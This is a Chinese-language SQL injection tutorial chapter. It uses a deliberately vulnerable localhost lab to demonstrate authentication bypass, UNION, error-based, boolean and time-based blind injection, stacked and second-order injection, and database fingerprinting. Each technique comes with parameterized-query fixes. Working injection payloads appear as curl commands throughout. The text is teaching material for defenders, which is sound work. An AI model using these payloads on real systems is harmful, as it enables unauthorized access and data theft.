# 第二章：SQL 注入分类、原理与本地实验

## 1. 本章目标和实验边界

本章通过本目录下的 `lab/local_sqli_lab.py` 演示 SQL 注入。程序具有故意保留的漏洞，只监听本机回环地址，数据全部是虚构内容。不要修改监听地址把它暴露到局域网或公网。

启动实验程序：

```bash
cd 网络安全自学/SQL注入系统教程/lab
python3 local_sqli_lab.py
```

浏览器访问：

```text
http://127.0.0.1:8765/
```

也可以使用 `curl`：

```bash
curl 'http://127.0.0.1:8765/product?id=1'
curl --get 'http://127.0.0.1:8765/search' --data-urlencode 'q=SQL'
```

停止程序按 `Ctrl+C`。程序每次启动都会在内存中重建数据，不会连接真实数据库。

## 2. SQL 注入的根本原因

SQL 注入不是“输入里出现了单引号”，而是应用把不可信输入作为 SQL 源代码的一部分交给数据库解析。

漏洞版本：

```python
sql = "SELECT id, name, price FROM products WHERE id = " + product_id
rows = connection.execute(sql).fetchall()
```

安全版本：

```python
sql = "SELECT id, name, price FROM products WHERE id = ?"
rows = connection.execute(sql, (product_id,)).fetchall()
```

两者的区别不是是否“过滤特殊字符”，而是解析边界：

```text
拼接：应用生成一整段文本 -> 数据库把整段文本解析成 SQL
绑定：数据库解析固定模板 -> 驱动把输入作为一个不可拆分的值绑定
```

一个典型 payload 可以抽象为三部分：

```text
[结束原上下文] + [加入攻击者控制的表达式] + [消除剩余原语句]
```

例如原模板为：

```sql
SELECT id FROM users
WHERE username = '$username' AND password = '$password';
```

如果用户名输入为：

```text
' OR '1'='1' -- comment
```

最终语句可能变成：

```sql
SELECT id FROM users
WHERE username = '' OR '1'='1' -- comment' AND password = 'anything';
```

这里依次发生了：单引号结束字符串、`OR` 加入恒真条件、注释忽略剩余引号和密码条件。这个示例只用于本地实验路由 `/login`。

## 3. 判断输入所处的 SQL 上下文

同一个输入，在不同模板中需要完全不同的分析。

### 3.1 字符串上下文

```sql
SELECT * FROM users WHERE username = '$input';
```

输入位于单引号字符串中。要改变结构，必须让数据库认为原字符串已经结束。仅输入普通 `alice` 时，最终条件是 `username = 'alice'`。

### 3.2 数字上下文

```sql
SELECT * FROM products WHERE id = $input;
```

数字周围没有引号。`1 AND 1=1` 在语法上可能直接成为表达式，不需要先闭合字符串。数字类型并不自动安全：如果应用仍然拼接，就仍存在注入；正确做法是先做类型校验，再绑定参数。

### 3.3 `LIKE` 上下文

```sql
SELECT * FROM products WHERE name LIKE '%$input%';
```

输入两侧除了引号还有 `%`。分析时必须把前后通配符也放进完整语句，不然很容易得到语法错误。

### 3.4 标识符和排序上下文

```sql
SELECT id, name, price FROM products ORDER BY $input;
```

这里需要的是列名或表达式，不是普通字符串值。把输入简单加引号会变成一个常量排序，不能实现动态列选择。安全方案是固定映射，而不是参数绑定一整个标识符。

### 3.5 括号、JSON 和子句上下文

```sql
WHERE id IN ($input)
WHERE JSON_VALUE(profile, '$.$input') = 'yes'
LIMIT $input
```

还要考虑输入前后的括号、逗号、路径语法和关键字。任何测试都应该先写出完整 SQL 模板，再推导输入的作用。

## 4. 一套可靠的手工验证流程

仅在本地或授权靶场中按以下顺序进行：

1. **建立基线**：记录正常输入的状态码、正文长度、关键文字和响应时间；
2. **观察异常**：使用与上下文有关的引号或括号，判断是否出现数据库错误或行为变化；
3. **构造真假对照**：使用结构相同、只有条件真假不同的两个输入；
4. **排除业务波动**：重复请求，确认差异稳定，不是缓存、推荐算法或网络抖动；
5. **使用最小证明**：验证输入能否改变条件即可，不读取真实敏感信息；
6. **查看服务端证据**：在自有环境中对照应用日志、最终 SQL 和数据库日志；
7. **修复并复测**：改用参数绑定后，原输入应作为普通值处理。

单独出现 SQL 错误不等于已经证明可利用，页面内容不同也不一定由 SQL 引起。结论需要可重复的真假对照。

## 5. 注释和语句剩余部分

常见注释语法：

| 数据库 | 单行注释 | 块注释 |
|---|---|---|
| MySQL | `-- `、`#` | `/* ... */` |
| PostgreSQL | `-- ` | `/* ... */` |
| SQL Server | `-- ` | `/* ... */` |
| SQLite | `-- ` | `/* ... */` |

MySQL 的 `--` 后通常要求空白字符，因此示例写作 `-- `。HTTP 客户端可能忽略 URL 末尾空格，使用 URL 编码或让后面跟普通字符更稳定。另一种思路是不使用注释，而是让原语句剩余部分在语法和逻辑上仍然成立。

注释本身不是漏洞。禁止注释符也不能修复拼接查询，因为攻击者可能通过配平引号和表达式保留剩余语句。

## 6. 布尔恒真与认证绕过

### 6.1 成立条件

认证代码把用户名和密码直接拼入同一条查询，并且只检查“是否返回至少一行”：

```python
sql = (
    "SELECT id, username, role FROM lab_users "
    f"WHERE username = '{username}' AND password = '{password}'"
)
row = connection.execute(sql).fetchone()
```

### 6.2 本地实验

正常失败请求：

```bash
curl --get 'http://127.0.0.1:8765/login' \
  --data-urlencode 'username=alice' \
  --data-urlencode 'password=wrong'
```

本地漏洞验证：

```bash
curl --get 'http://127.0.0.1:8765/login' \
  --data-urlencode "username=' OR '1'='1' -- " \
  --data-urlencode 'password=wrong'
```

服务器终端会打印最终 SQL。你应逐字符确认：

- 第一个 `'` 闭合了空用户名；
- `OR '1'='1'` 使条件恒真；
- `-- ` 使密码判断不再参与查询；
- 应用错误地把返回的第一行视为认证成功。

### 6.3 为什么真实认证不应这样实现

安全流程通常是：根据规范化后的唯一用户名执行参数化查询，取出密码哈希，再由密码哈希库验证口令。即使查询参数化，也不能直接保存明文密码或使用普通散列。

### 6.4 同类变体

恒真表达式可以使用数字、字符串、比较或逻辑组合，因此黑名单封禁某个固定字符串没有意义。修复应改变数据与代码的边界。

## 7. `UNION` 联合查询注入

### 7.1 原理和成立条件

`UNION` 把两个 `SELECT` 的结果纵向合并。要成立必须满足：

1. 原查询结果会显示到响应中；
2. 两个查询的列数相同；
3. 对应位置的数据类型兼容；
4. 当前数据库账号有权读取被选择的对象；
5. 应用或驱动没有在更早阶段阻止结构被改变。

本地 `/product` 的原查询固定返回三列：

```sql
SELECT id, name, price FROM products WHERE id = $input;
```

### 7.2 确认列数

在本地实验中，可用递增排序位置观察何时越界：

```text
1 ORDER BY 1
1 ORDER BY 2
1 ORDER BY 3
1 ORDER BY 4
```

前三个位置存在，第四个通常报错，因此推断原查询有三列。对应请求：

```bash
curl --get 'http://127.0.0.1:8765/product' \
  --data-urlencode 'id=1 ORDER BY 3'
```

也可逐步尝试 `UNION SELECT NULL`、`UNION SELECT NULL,NULL`。`NULL` 能与较多类型兼容，适合定位列数；这不是读取数据，只是验证结构。

### 7.3 确认可显示位置

让原查询不返回行，再在三个位置放置清晰标记：

```text
-1 UNION SELECT 101,'UNION-MARKER',303
```

```bash
curl --get 'http://127.0.0.1:8765/product' \
  --data-urlencode "id=-1 UNION SELECT 101,'UNION-MARKER',303"
```

如果响应显示三项标记，就证明第二条查询结果进入页面。真实项目的最小证明应到此为止，或者只查询授权方专门准备的测试值。

### 7.4 读取训练值

本靶场允许读取 `products.training_flag` 作为实验目标：

```text
-1 UNION SELECT id,name,training_flag FROM products WHERE id=1
```

这一步展示“列数匹配、类型兼容、结果可见”如何组合。不要把表名替换成真实系统中的用户、凭据、令牌或个人信息表。

### 7.5 `UNION` 与 `UNION ALL`

`UNION` 会去重，`UNION ALL` 保留重复并避免去重开销。测试时原查询可能同时返回正常行，为了让结果容易判断，通常让原条件不匹配，例如使用不存在的负数 ID。

## 8. 报错型注入

### 8.1 原理

报错型注入让数据库在执行攻击者控制的表达式时产生错误，并观察错误中是否包含表达式求值结果。成立条件是应用把详细数据库异常返回给客户端。

常见信号包括：

- 未闭合字符串；
- 类型转换失败；
- 列数不匹配；
- 未知函数或列名；
- XML/JSON/几何函数抛出的详细异常。

### 8.2 方言示例的含义

在专用靶场中，类型转换错误可用于确认某个表达式被数据库执行。例如 PostgreSQL 中把数据库名强制转成整数：

```sql
CAST(current_database() AS INTEGER)
```

SQL Server 的相同思想可能写成：

```sql
CONVERT(INT, DB_NAME())
```

如果错误消息包含无法转换的字符串，就泄露了表达式结果。MySQL 历史版本中还存在利用 XML 函数错误消息的技巧，但函数可用性随版本变化。不要依赖某个固定函数列表；防御重点是参数化与不向客户端返回数据库异常。

### 8.3 本地实验观察

SQLite 靶场可用不匹配的 `UNION` 列数制造无害错误：

```bash
curl --get 'http://127.0.0.1:8765/product' \
  --data-urlencode 'id=-1 UNION SELECT 1,2'
```

漏洞路由故意返回错误文字，安全路由则统一返回普通错误。比较两者：

```bash
curl --get 'http://127.0.0.1:8765/safe/product' \
  --data-urlencode 'id=-1 UNION SELECT 1,2'
```

隐藏错误只能减少信息泄露，不能单独修复注入。

## 9. 布尔盲注

### 9.1 为什么叫“盲”

应用不显示查询结果和错误，只返回两种可观察状态，例如：

```text
条件为真 -> Found
条件为假 -> Not found
```

攻击者不能直接看到所查询的值，但可以把关于某个值的问题转换成真/假条件。

### 9.2 先建立真假对照

本地 `/blind` 使用数字上下文：

```bash
curl --get 'http://127.0.0.1:8765/blind' --data-urlencode 'id=1 AND 1=1'
curl --get 'http://127.0.0.1:8765/blind' --data-urlencode 'id=1 AND 1=2'
```

两次响应分别为 `Found` 和 `Not found`，且结构和长度稳定，说明输入可以控制条件结果。

### 9.3 对训练值提出问题

SQLite 的 `substr(text, start, length)` 可以检查实验标记的第一个字符：

```text
1 AND substr((SELECT training_flag FROM products WHERE id=1),1,1)='L'
```

如果返回 `Found`，说明条件为真。然后可验证一个明显错误的字符，形成对照。

### 9.4 逐字符与二分判断

最直观的方法是逐个候选字符比较，但请求数很多。更高效的教学方法是比较字符编码大小并做二分：

```sql
unicode(substr((SELECT training_flag FROM products WHERE id=1), 1, 1)) > 77
```

如果候选范围是可打印 ASCII，大约 7 次真假判断可确定一个字符。这也解释了为什么盲注速度慢、请求多、容易被速率限制和异常模式检测发现。

只对本地 `training_flag` 做这个实验。不要用盲注枚举真实账号、密码哈希或令牌。

## 10. 时间盲注

### 10.1 原理

当页面内容完全一致时，可以让数据库在条件为真时延迟，条件为假时立即响应：

```text
条件为真 -> 大约延迟 N 秒
条件为假 -> 正常返回
```

常见方言的延迟能力：

| 数据库 | 常见延迟表达式 |
|---|---|
| MySQL | `SLEEP(seconds)` |
| PostgreSQL | `pg_sleep(seconds)` |
| SQL Server | `WAITFOR DELAY '00:00:02'` |
| Oracle | 需要相应权限的延迟包或其他时间差方式 |
| SQLite | 默认没有通用 SQL 延迟函数 |

本地程序专门注册了 `lab_sleep()` 函数，仅用于理解时间差：

```bash
time curl --get 'http://127.0.0.1:8765/time' \
  --data-urlencode 'id=1 AND CASE WHEN 1=1 THEN lab_sleep(1) ELSE 0 END=0'

time curl --get 'http://127.0.0.1:8765/time' \
  --data-urlencode 'id=1 AND CASE WHEN 1=2 THEN lab_sleep(1) ELSE 0 END=0'
```

### 10.2 如何降低误判

- 先测量十次左右正常请求，建立延迟分布；
- 延迟阈值应明显高于网络抖动，但不要设置过长；
- 真、假条件交替测试，防止把负载变化当作注入；
- 控制并发，避免自己的请求制造拥塞；
- 在自有环境中结合数据库慢查询日志确认。

时间差只能说明某个条件可能影响查询耗时，需要更多证据排除缓存、锁、限流和后端调用。

## 11. 堆叠查询

堆叠查询指同一次调用中用语句分隔符执行多条 SQL：

```sql
SELECT * FROM products WHERE id = 1;
SELECT 1;
```

是否成立取决于数据库、驱动、连接配置和调用 API。许多驱动默认只允许一条语句；有些 API 需要显式开启 multi-statements。

本地 SQLite 程序使用 `execute()`，会拒绝一次执行多条语句。因此输入 `1; SELECT 1` 应得到错误。这是一个重要结论：存在拼接不代表每一种注入技术都可用。

不要使用数据修改、文件操作或系统命令验证堆叠查询。无害的第二条 `SELECT`、服务端日志和测试数据库即可证明风险。

## 12. 二次注入

### 12.1 原理

二次注入分两个阶段：

1. 输入先作为普通数据安全地存入数据库；
2. 另一个功能读取该数据并再次拼接到新 SQL 中，此时才改变语句结构。

伪代码：

```python
# 第一步安全保存；此时没有注入
cursor.execute("INSERT INTO profiles(display_name) VALUES (?)", (name,))

# 第二步错误地信任数据库中的旧数据
stored_name = load_profile_name(profile_id)
sql = "SELECT * FROM audit_log WHERE actor = '" + stored_name + "'"
cursor.execute(sql)
```

关键认识：数据库里的数据不自动成为可信数据。来自用户、导入文件、第三方 API 或旧系统的数据，每次进入 SQL 都必须绑定参数。

### 12.2 如何测试和修复

在测试环境保存包含单引号的普通合法姓名，例如 `O'Reilly`，再使用所有读取和报表功能。如果后续查询报错，就暴露了二次拼接问题。修复第二阶段的查询，而不是禁止姓名中出现单引号。

## 13. 存储过程中的注入

存储过程不天然安全。固定 SQL 加参数通常安全：

```sql
SELECT id, name FROM products WHERE category = input_category;
```

如果过程内部构造动态 SQL，仍可能注入：

```text
dynamic_sql = 'SELECT ... ORDER BY ' + input_sort
execute(dynamic_sql)
```

修复思路与应用层相同：值使用数据库提供的动态 SQL 参数绑定机制；标识符使用白名单映射；过程运行账号遵循最小权限。

## 14. 带外注入

带外注入让数据库通过 DNS、HTTP、文件共享或其他外部通道产生交互。它通常要求额外网络能力、扩展、系统过程或高权限，风险明显高于普通查询验证。

本教程不提供带外 payload、接收端配置或数据编码方法。防御者应关注：

- 数据库服务器默认禁止不必要的出站网络；
- 关闭不需要的扩展、外部过程和文件访问；
- 使用网络出口白名单和 DNS 日志；
- 应用账号不拥有调用高风险能力的权限。

## 15. 按输入位置分类

### 15.1 URL 查询参数

```http
GET /product?id=1 HTTP/1.1
```

最直观，但不能只测试 GET。

### 15.2 表单和 JSON 请求体

```http
POST /api/search HTTP/1.1
Content-Type: application/json

{"category":"book","sort":"price"}
```

JSON 字符串合法不等于 SQL 安全。JSON 解析只建立了 HTTP 数据结构，后端仍可能拼接字段。

### 15.3 Cookie 和请求头

语言、主题、追踪 ID、设备 ID、`User-Agent`、`Referer` 等可能被写入查询或日志数据库。它们都由客户端控制，不能因为“不在表单里”就信任。

### 15.4 路径参数和文件导入

REST 路径、CSV 单元格、消息队列事件和第三方同步数据也可能在之后进入 SQL，尤其容易形成二次注入。

## 16. 按结果通道分类

| 类别 | 主要观察 | 特点 |
|---|---|---|
| 联合查询 | 页面直接出现第二条查询结果 | 清晰、请求少，但要求结果可见 |
| 报错型 | 数据库错误包含表达式信息 | 依赖详细错误和数据库函数 |
| 布尔盲注 | 页面、状态码或长度随真假变化 | 请求多，需稳定对照 |
| 时间盲注 | 响应时间随真假变化 | 最慢，最容易受抖动影响 |
| 带外 | 外部系统收到数据库交互 | 权限要求高，本教程不实操 |

这些技术可以同时存在。自动化工具会根据响应和数据库特征选择可用技术，不代表所有检测结果都同样可靠。

## 17. 数据库指纹识别

不同数据库的错误文本、函数、系统目录和语法差异可用于形成假设：

- MySQL：`You have an error in your SQL syntax`、反引号、`LIMIT`；
- PostgreSQL：`syntax error at or near`、类型转换较严格、`::type`；
- SQL Server：`Unclosed quotation mark`、`TOP`、`WAITFOR`；
- SQLite：`SQLite`、`no such column`、`sqlite_version()`；
- Oracle：`ORA-` 错误号、`FROM dual`、不同的分页历史语法。

指纹应由多项证据支持。代理、ORM 和统一错误页可能隐藏或伪装特征；不要只凭一条错误就强制工具使用某个 DBMS。

## 18. 编码与规范化

输入可能经历 URL 解码、JSON 解码、字符集转换、框架参数合并和数据库连接编码。如果过滤器和数据库看到的文本不一致，就可能出现规范化问题。

防御原则：

- 在明确的字符集下尽早规范化输入；
- 对重复参数采用确定策略，不能让网关检查第一个、应用使用最后一个；
- 校验用于业务约束，参数绑定用于 SQL 结构安全，两者都需要；
- 不设计“把危险字符删除后继续拼接”的过滤器。

第四章会从防守角度进一步分析这些薄弱措施为什么失效。

## 19. 常见误判

- 输入单引号返回 500：可能只是其他解析器或模板错误；
- 页面长度变化：可能是随机内容、广告、时间戳或 CSRF Token；
- 响应变慢：可能是缓存未命中、锁竞争或限流；
- WAF 返回 403：说明某个模式被拦截，不代表后端存在注入；
- 工具报告“可能可注入”：仍需人工核对真假对照和服务端证据；
- 查询返回额外行：可能是业务搜索语义或类型转换，不一定改变了 SQL 结构。

## 20. 从发现到修复的完整记录

一份合格的实验报告至少记录：

1. 路由、HTTP 方法和参数位置；
2. 正常请求与基线响应；
3. 真条件和假条件请求；
4. 应用拼接代码或最终 SQL 证据；
5. 可用技术类型及成立条件；
6. 数据库账号权限和潜在影响；
7. 参数化修复代码；
8. 修复后同样请求的结果；
9. 自动化回归测试和日志检测建议。

## 21. 本章练习

1. 对 `/product` 写出正常输入、排序列数判断、三列联合标记对应的完整 SQL。
2. 对 `/search` 分析输入前后的 `%` 和单引号，构造一组真假条件并解释每个字符。
3. 对 `/blind` 分别验证真、假条件，记录正文差异。
4. 对本地 `training_flag` 的第一个字符执行一次相等判断和一次编码大小判断。
5. 对 `/time` 各执行五次真、假条件，计算平均时间并分析抖动。
6. 用包含单引号的合法姓名解释二次注入为什么不能靠禁止特殊字符修复。
7. 访问 `/safe/product`，确认相同注入字符串只会作为一个普通参数值。
8. 阅读靶场源码，为每个漏洞路由写出对应的参数化修复。

完成练习后，第三章将展示 sqlmap 如何自动完成“基线、真假对照、技术识别和有限枚举”，以及每个常见参数如何影响请求。
